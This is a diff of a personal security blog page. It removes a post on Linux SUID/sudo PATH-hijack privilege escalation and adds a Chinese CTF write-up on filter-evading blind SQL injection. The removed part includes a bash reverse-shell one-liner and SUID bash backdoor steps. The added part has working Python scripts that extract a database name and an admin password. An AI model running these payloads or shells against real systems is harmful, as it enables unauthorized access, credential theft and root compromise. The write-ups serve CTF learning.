@@ -16,25 +16,24 @@
   <meta name="author" content="rightevil">
   <meta name="keywords" content="">
   
-    <meta name="description" content="a PE(privilege escalation) way in local linux using sudo,suid file">
+    <meta name="description" content="参考wp：https:&#x2F;&#x2F;www.yuque.com&#x2F;u21437924&#x2F;ap9vtm&#x2F;gqkc3dcfmfpe5p85?singleDoc#RI7de https:&#x2F;&#x2F;blog.csdn.net&#x2F;cai_huaer&#x2F;article&#x2F;details&#x2F;151112526?spm&#x3D;1001.2014.3001.5502 这2个写的都很好，很惭愧，每次遇到难题都没想过自己去琢磨，而是在常规手段出不来后就">
 <meta property="og:type" content="article">
-<meta property="og:title" content="SUID,SUDO binary hijack">
-<meta property="og:url" content="https://rightevil.github.io/SUID,SUDO-binary-hijack/index.html">
+<meta property="og:title" content="bugku-sql注入 wp">
+<meta property="og:url" content="https://rightevil.github.io/bugku-sql%E6%B3%A8%E5%85%A5-wp/index.html">
 <meta property="og:site_name" content="rightevil">
-<meta property="og:description" content="a PE(privilege escalation) way in local linux using sudo,suid file">
+<meta property="og:description" content="参考wp：https:&#x2F;&#x2F;www.yuque.com&#x2F;u21437924&#x2F;ap9vtm&#x2F;gqkc3dcfmfpe5p85?singleDoc#RI7de https:&#x2F;&#x2F;blog.csdn.net&#x2F;cai_huaer&#x2F;article&#x2F;details&#x2F;151112526?spm&#x3D;1001.2014.3001.5502 这2个写的都很好，很惭愧，每次遇到难题都没想过自己去琢磨，而是在常规手段出不来后就">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2024-03-12T14:35:56.000Z">
-<meta property="article:modified_time" content="2024-03-12T15:12:42.197Z">
+<meta property="article:published_time" content="2026-01-28T03:27:37.000Z">
+<meta property="article:modified_time" content="2026-01-28T04:26:32.795Z">
 <meta property="article:author" content="rightevil">
-<meta property="article:tag" content="Linux">
-<meta property="article:tag" content="penetrate">
+<meta property="article:tag" content="ctf">
 <meta name="twitter:card" content="summary_large_image">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
   
   
-  <title>SUID,SUDO binary hijack - rightevil</title>
+  <title>bugku-sql注入 wp - rightevil</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -253,7 +252,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="SUID,SUDO binary hijack"></span>
+            <span id="subtitle" data-typed-text="bugku-sql注入 wp"></span>
           
         </div>
 
@@ -264,8 +263,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2024-03-12 22:35" pubdate>
-          2024年3月12日 晚上
+        <time datetime="2026-01-28 11:27" pubdate>
+          2026年1月28日 上午
         </time>
       </span>
     
@@ -277,7 +276,7 @@
         <i class="iconfont icon-chart"></i>
         
           <!-- compatible with older versions-->
-          1.3k 字
+          4.9k 字
         
       </span>
     
@@ -289,7 +288,7 @@
         
         
           <!-- compatible with older versions-->
-          11 分钟
+          41 分钟
         
       </span>
     
@@ -335,30 +334,28 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">SUID,SUDO binary hijack</h1>
+            <h1 style="display: none">bugku-sql注入 wp</h1>
             
             
               <div class="markdown-body">
                 
-                <h1 id="find-the-suid-file"><a href="#find-the-suid-file" class="headerlink" title="find the suid file"></a>find the suid file</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -perm -4000 2&gt;/dev/null<br></code></pre></td></tr></table></figure>
-<p>if it was in the list of GTFObins<br><em><a target="_blank" rel="noopener" href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></em><br>so excute command follow GTFObins,if it not in the list.<br>use follow ways</p>
-<h1 id="Sudo-command-SUID-binary-without-command-path"><a href="#Sudo-command-SUID-binary-without-command-path" class="headerlink" title="Sudo command/SUID binary without command path"></a>Sudo command/SUID binary without command path</h1><p><strong>sudo:</strong><br>If the <strong>sudo permission</strong> is given to a single command <em>without specifying the path</em>: <strong>hacker10 ALL= (root) less</strong> you can exploit it by changing the PATH variable</p>
-<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">export</span> <span class="hljs-attribute">PATH</span>=/tmp:$PATH<br><span class="hljs-comment">#Put your backdoor in /tmp and name it &quot;less&quot;</span><br>sudo less<br></code></pre></td></tr></table></figure>
-<p><strong>suid:</strong><br>using strings to check the suid file</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">strings reset_pass <br>···<br><span class="hljs-built_in">echo</span> john:john | chpasswd<br>···<br></code></pre></td></tr></table></figure>
-<p>in this binary file, it dont specify the command path,so we could inject the path</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">export</span> PATH=$(<span class="hljs-built_in">pwd</span>):<span class="hljs-variable">$PATH</span><br></code></pre></td></tr></table></figure>
-<p>check the PATH</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-variable">$PATH</span><br>/home/john:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/snap/bin<br></code></pre></td></tr></table></figure>
-<p>and move the bound reverse-shell into this path(/home/john) and name it chpasswd(remember add x to the file)<br>bound reverse-shell</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br>bash -i &gt;&amp; /dev/tcp/192.168.166.195/80 0&gt;&amp;1<br></code></pre></td></tr></table></figure>
-<p>and excute the suid binary file.<br>or we could add a suid bash file</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> -ne <span class="hljs-string">&#x27;#!/bin/bash\ncp /bin/bash /dev/shm/bash\nchmod 4775 /dev/shm/bash&#x27;</span>&gt; chpasswd<br><span class="hljs-built_in">chmod</span> 777 chpasswd<br></code></pre></td></tr></table></figure>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/dev/shm/bash -p<br></code></pre></td></tr></table></figure>
-<p>if i meet new situation, i will update the article.</p>
-<h1 id="recommend-blog-or-material"><a href="#recommend-blog-or-material" class="headerlink" title="recommend blog or material"></a>recommend blog or material</h1><p><a target="_blank" rel="noopener" href="https://medium.com/r3d-buck3t/hijacking-relative-paths-in-suid-programs-fed804694e6e">Hijacking Relative Paths in SUID Programs | by Nairuz Abulhul | R3d Buck3T | Medium</a></p>
-<p><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-command-suid-binary-without-command-path">Linux Privilege Escalation | HackTricks | HackTricks</a></p>
-<p><a target="_blank" rel="noopener" href="https://juggernaut-sec.com/suid-sgid-part-2-lpe/#Exploiting_SUID_Binaries_%E2%80%93_Shared_Object_Injection">SUID | SGID Part-2 – Linux Privilege Escalation</a></p>
+                <p>参考wp：<a target="_blank" rel="noopener" href="https://www.yuque.com/u21437924/ap9vtm/gqkc3dcfmfpe5p85?singleDoc#RI7de">https://www.yuque.com/u21437924/ap9vtm/gqkc3dcfmfpe5p85?singleDoc#RI7de</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/cai_huaer/article/details/151112526?spm=1001.2014.3001.5502">https://blog.csdn.net/cai_huaer/article/details/151112526?spm=1001.2014.3001.5502</a></p>
+<p>这2个写的都很好，很惭愧，每次遇到难题都没想过自己去琢磨，而是在常规手段出不来后就去看wp</p>
+<h1 id="爆破数据库名"><a href="#爆破数据库名" class="headerlink" title="爆破数据库名"></a>爆破数据库名</h1><p>根据csdn那个wp，他的布尔盲住思路很新奇，非常值得学习</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">username=aaa&#x27;-(ascii(substr(database()from(1)))-98)-&#x27;&amp;password=admin<br></code></pre></td></tr></table></figure>
+
+<p>大意就是sql会把字符隐式转换为数字然后去做加减<code>username=a&#39;-0-&#39;</code>，在数据库中就是<code>select username from xxx where username=&#39;a&#39;-0-&#39;&#39;</code>，’a’会变为0-0=0，后面的’’也看为0，得到的结果为0，会匹配任何以数字0开头的用户名，如果中间换成1，结果就是-1，匹配不到数据。然后根据这一点来写脚本爆破。因为这个题目过滤了很多字符，所以脚本要稍微注意一点。</p>
+<p>该脚本产自Gemini3</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs shell">import requests<br>import string<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">配置目标 URL</span><br>url = &quot;http://171.80.2.169:11490/index.php&quot;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">题目要求的 HTTP 头</span><br>headers = &#123;<br>    &quot;Host&quot;: &quot;171.80.2.169:11490&quot;,<br>    &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;,<br>    &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36&quot;,<br>    &quot;Origin&quot;: &quot;http://171.80.2.169:11490&quot;,<br>    &quot;Referer&quot;: &quot;http://171.80.2.169:11490/&quot;<br>&#125;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">字典</span><br>chars = string.ascii_lowercase + string.digits + &quot;_-@.&quot;<br><br>print(&quot;[-] 开始爆破数据库名 (长度: 8)...&quot;)<br>print(&quot;[-] 绕过策略: 无空格(用括号)，无逗号(用FROM)，无FOR(利用ASCII特性)&quot;)<br><br>db_name = &quot;&quot;<br><br>for i in range(1, 9):<br>    found_char = False<br>    for char in chars:<br>        char_ascii = ord(char)<br>        <br>        # 核心 Payload:<br>        # 1. 用 FROM(i) 代替 FROM i (绕过空格)<br>        # 2. 去掉 FOR 1 (利用 ASCII 只取首字符特性，绕过 FOR)<br>        # 3. 整体无空格，无逗号<br>        <br>        # 构造 SQL 片段: ascii(substr(database()from(i)))-char_ascii<br>        injection = f&quot;ascii(substr(database()from(&#123;i&#125;)))-&#123;char_ascii&#125;&quot;<br>        <br>        # 拼凑 POST body<br>        data_payload = f&quot;username=aaa&#x27;-(&#123;injection&#125;)-&#x27;&amp;password=admin&quot;<br>        <br>        try:<br>            # data 参数传字符串，避免 requests 自动处理造成干扰<br>            res = requests.post(url, headers=headers, data=data_payload, timeout=5)<br>            <br>            # 这里的判断逻辑是：<br>            # 如果猜对了 -&gt; injection 结果为 0 -&gt; username=aaa&#x27;-0-&#x27; -&gt; 真 -&gt; passwd error<br>            # 如果猜错了 -&gt; injection 结果为 非0 -&gt; username=aaa&#x27;-非0-&#x27; -&gt; 假 -&gt; username dont exist<br>            if &quot;password error&quot; in res.text:<br>                db_name += char<br>                print(f&quot;[+] Found char &#123;i&#125;: &#123;char&#125; -&gt; Current DB: &#123;db_name&#125;&quot;)<br>                found_char = True<br>                break<br>                <br>        except Exception as e:<br>            print(f&quot;[!] Error: &#123;e&#125;&quot;)<br><br>    if not found_char:<br>        print(f&quot;[!] 第 &#123;i&#125; 位字符未找到，可能使用了特殊字符或 Payload 被拦截。&quot;)<br>        db_name += &quot;?&quot;<br><br>print(f&quot;\n[success] 最终数据库名: &#123;db_name&#125;&quot;)<br></code></pre></td></tr></table></figure>
+
+<p> 然后爆破表和列名都只能用字典去爆破了：</p>
+<p>语句是这样的：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">爆破表名</span><br>username=aaa&#x27;or(select(1)from(blindsql.flag))#&amp;password=admin<br><span class="hljs-meta prompt_">#</span><span class="language-bash">爆破列名</span><br>username=aaa&#x27;or(select(password)from(admin))#&amp;password=admin<br></code></pre></td></tr></table></figure>
+
+<h1 id="爆破数据"><a href="#爆破数据" class="headerlink" title="爆破数据"></a>爆破数据</h1><p>一开始直接让ai写脚本，但是死活出问题，后面给他参考了别人的才写出来。原理还是<code>username=a&#39;or真</code>返回password error，若or后面的条件为false，就返回dont exist</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs shell">import requests<br>import string<br>import sys<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">--- 配置区域 ---</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">使用你之前题目给出的 URL</span><br>url = &quot;http://171.80.2.169:15666/index.php&quot;<br>headers = &#123;<br>    &quot;Host&quot; : &quot;171.80.2.169:15666&quot; ,<br>    &quot;Content-Type&quot; : &quot;application/x-www-form-urlencoded&quot; ,<br>    &quot;User-Agent&quot; : &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36&quot; ,<br>&#125;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">目标</span><br>table_name = &quot;admin&quot;<br>column_name = &quot;password&quot;<br><br>print( f&quot;[-] 开始利用线性扫描 (Linear Scan) 读取 &#123;table_name&#125;.&#123;column_name&#125; ...&quot; )<br>print( &quot;[-] 逻辑: ddd&#x27; OR (ascii &gt; j) #&quot; )<br>print( &quot;[-] 遇到 &#x27;username dont exist&#x27; 说明条件停止成立，锁定字符。&quot; )<br><br>final_data = &quot;&quot;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">假设密码长度 1 到 40</span><br>for i in range( 1 , 41 ) :<br>    found_char = False<br><br>    # 遍历可见字符 ASCII 码 (32 - 127)<br>    # 类似于别人的 range(32, 128)<br>    for j in range( 32 , 128 ) :<br><br>        # 构造你的 Payload<br>        # ddd&#x27;or(ASCII(MID((SELECT(password)FROM(admin))FROM(&#123;i&#125;))))&gt;&#123;j&#125;#<br><br>        # 注意：这里 %23 是 # 的 URL编码。request data 字典有时会自动编码，有时不会，<br>        # 为了稳妥，我们直接在字符串里写 #，因为 requests 会帮我们转义 body<br>        payload_str = f&quot;ddd&#x27;or(ascii(mid((select(&#123;column_name&#125;)from(&#123;table_name&#125;))from(&#123;i&#125;)))&gt;&#123;j&#125;)#&quot;<br><br>        data_payload = &#123;<br>            &quot;username&quot; : payload_str ,<br>            &quot;password&quot; : &quot;admin&quot;<br>        &#125;<br><br>        try :<br>            # 发送请求<br>            res = requests.post( url , headers=headers , data=data_payload , timeout=3 )<br><br>            # --- 核心判断逻辑 (和别人的脚本一致) ---<br><br>            # 情况 1: 猜对了吗？(Payload &gt; j 为真)<br>            # 如果 ddd&#x27; OR True -&gt; 登录成功 -&gt; passwd error<br>            # 这意味着当前字符 ASCII 码比 j 大，还需要继续往后找<br>            if &quot;password error&quot; in res.text :<br>                continue  # 继续内层循环，j 加 1<br><br>            # 情况 2: 猜过头了吗？(Payload &gt; j 为假)<br>            # 如果 ddd&#x27; OR False -&gt; 用户不存在 -&gt; username dont exist<br>            # 这意味着当前字符 ASCII 码 不大于 j (即等于 j)，因为刚才 j-1 的时候还是 True<br>            elif &quot;username does not exist!&quot; in res.text :<br>                char = chr( j )<br>                final_data += char<br>                print( f&quot;[+] 第 &#123;i&#125; 位: &#123;char&#125; (ascii: &#123;j&#125;) | 当前: &#123;final_data&#125;&quot; )<br>                found_char = True<br>                break  # 找到了，跳出内层 j 循环，去读下一位 i<br><br>            # 其他情况（如报错）<br>            else :<br>                pass<br><br>        except Exception as e :<br>            print( f&quot;[!] Error: &#123;e&#125;&quot; )<br>            break<br><br>    # 如果遍历完 32-127 还没找到，说明这一位可能没有字符了（结束了）<br>    if not found_char :<br>        print( &quot;\n[*] 扫描结束。&quot; )<br>        break<br><br>print( f&quot;\n[Success] 最终密码: &#123;final_data&#125;&quot; )<br></code></pre></td></tr></table></figure>
+
 
                 
               </div>
@@ -387,7 +384,7 @@
     
       <span class="category-chain">
         
-  <a href="/categories/Linux/" class="category-chain-item">Linux</a>
+  <a href="/categories/ctf/" class="category-chain-item">ctf</a>
   
   
 
@@ -402,9 +399,7 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/Linux/">#Linux</a>
-      
-        <a href="/tags/penetrate/">#penetrate</a>
+        <a href="/tags/ctf/">#ctf</a>
       
     </div>
   
@@ -416,8 +411,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>SUID,SUDO binary hijack</div>
-      <div>https://rightevil.github.io/SUID,SUDO-binary-hijack/</div>
+      <div>bugku-sql注入 wp</div>
+      <div>https://rightevil.github.io/bugku-sql注入-wp/</div>
     </div>
     <div class="license-meta">
       
@@ -429,7 +424,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2024年3月12日</div>
+          <div>2026年1月28日</div>
         </div>
       
       
@@ -461,9 +456,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/vulnhub-wp-djinn/" title="vulnhub-wp djinn">
+                      <a href="/Java%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B05-TransformedMap/" title="Java学习笔记5-TransformedMap">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">vulnhub-wp djinn</span>
+                        <span class="hidden-mobile">Java学习笔记5-TransformedMap</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -471,8 +466,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/SMB-SMTP-SNMP-enum/" title="SMB,SMTP,SNMP enum">
-                        <span class="hidden-mobile">SMB,SMTP,SNMP enum</span>
+                      <a href="/Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B04-URLDNS%E9%93%BE%E5%AD%A6%E4%B9%A0/" title="Java安全学习笔记4-URLDNS链学习">
+                        <span class="hidden-mobile">Java安全学习笔记4-URLDNS链学习</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
